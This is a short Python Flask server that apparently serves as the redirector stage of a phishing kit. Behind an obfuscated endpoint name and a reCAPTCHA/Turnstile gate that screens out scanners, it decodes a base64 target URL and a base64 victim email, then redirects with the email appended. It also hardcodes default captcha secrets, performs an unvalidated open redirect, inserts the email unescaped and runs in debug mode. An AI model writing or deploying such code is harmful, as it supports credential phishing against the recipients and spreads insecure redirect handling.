import os
import base64
import requests
from flask import Flask, request, redirect, jsonify

app = Flask(__name__)

# Add your keys here or via environment variables
RECAPTCHA_SECRET = os.environ.get("RECAPTCHA_SECRET", "6Ld16e0rAAAAALhFGeGRYSczEOxLY8oe4MxPbvzW")
TURNSTILE_SECRET = os.environ.get("TURNSTILE_SECRET", "0x4AAAAAAB7B2hvk_FSWK2y8Gj2fQkvc7HY")

@app.route("/_0x35adc6", methods=["POST"])
def final_redirect():
    r_b64 = request.form.get("r")
    email_b64 = request.form.get("email")
    token = request.form.get("token")
    turnstile = request.form.get("turnstile")

    if not r_b64 or not email_b64:
        return jsonify({"status": "error", "message": "Missing parameters"}), 400

    # Verify Google reCAPTCHA token
    if token:
        try:
            res = requests.post(
                "https://www.google.com/recaptcha/api/siteverify",
                data={"secret": RECAPTCHA_SECRET, "response": token},
                timeout=10
            ).json()
            if not res.get("success") or res.get("score", 0) < 0.7:
                return jsonify({"status": "error", "message": "reCAPTCHA verification failed"}), 403
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    # Verify Cloudflare Turnstile token
    if turnstile:
        try:
            res = requests.post(
                "https://challenges.cloudflare.com/turnstile/v0/siteverify",
                data={"secret": TURNSTILE_SECRET, "response": turnstile},
                timeout=10
            ).json()
            if not res.get("success"):
                return jsonify({"status": "error", "message": "Turnstile verification failed"}), 403
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    # Decode redirect and email
    try:
        redirect_url = base64.b64decode(r_b64).decode()
        email_decoded = base64.b64decode(email_b64).decode()
    except Exception as e:
        return jsonify({"status": "error", "message": f"Base64 decode failed: {e}"}), 400

    sep = "&" if "?" in redirect_url else "?"
    final_url = f"{redirect_url}{sep}email={email_decoded}"
    return redirect(final_url, 302)

if __name__ == "__main__":
    app.run(debug=True)
